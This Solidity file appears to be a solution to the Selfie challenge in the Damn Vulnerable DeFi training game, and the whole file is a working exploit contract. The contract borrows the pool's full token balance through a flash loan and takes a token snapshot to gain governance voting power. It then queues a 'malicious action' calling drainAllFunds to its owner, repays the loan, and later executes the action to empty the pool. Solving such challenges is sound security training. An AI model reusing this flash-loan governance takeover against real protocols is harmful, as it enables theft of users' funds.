// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;

    function drainAllFunds(address receiver) external;
}

interface ISimpleGovernance {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);

    function executeAction(uint256 actionId) external payable;

    function getActionDelay() external view returns (uint256);
}

contract AttackSelfiePool {
    ISelfiePool pool;
    ISimpleGovernance governance;
    DamnValuableTokenSnapshot token;

    uint256 private actionId;
    address private owner;
    uint256 private poolBalance;

    constructor(
        address _pool,
        address _governance,
        address _token
    ) {
        pool = ISelfiePool(_pool);
        governance = ISimpleGovernance(_governance);
        token = DamnValuableTokenSnapshot(_token);
        owner = msg.sender;
    }

    function flashLoan() external {
        require(msg.sender == owner, "Only owner can call this function");
        poolBalance = token.balanceOf(address(pool));
        pool.flashLoan(poolBalance);
    }

    function receiveTokens(address, uint256 _borrowAmount) external {
        require(
            msg.sender == address(pool),
            "Only pool can call this function"
        );
        // create payload
        bytes memory governanceData = abi.encodeWithSignature(
            "drainAllFunds(address)",
            address(owner)
        );
        // take snapshot as it is checked in the queueAction
        token.snapshot();
        // queue the malicious action and store its id for withdrawal
        actionId = governance.queueAction(address(pool), governanceData, 0);
        // send borrowed tokens back
        require(token.transfer(address(pool), _borrowAmount), "Attack failed");
    }

    function withdrawTokens() external {
        require(msg.sender == owner, "Only owner can call this function");
        governance.executeAction(actionId);
    }
}
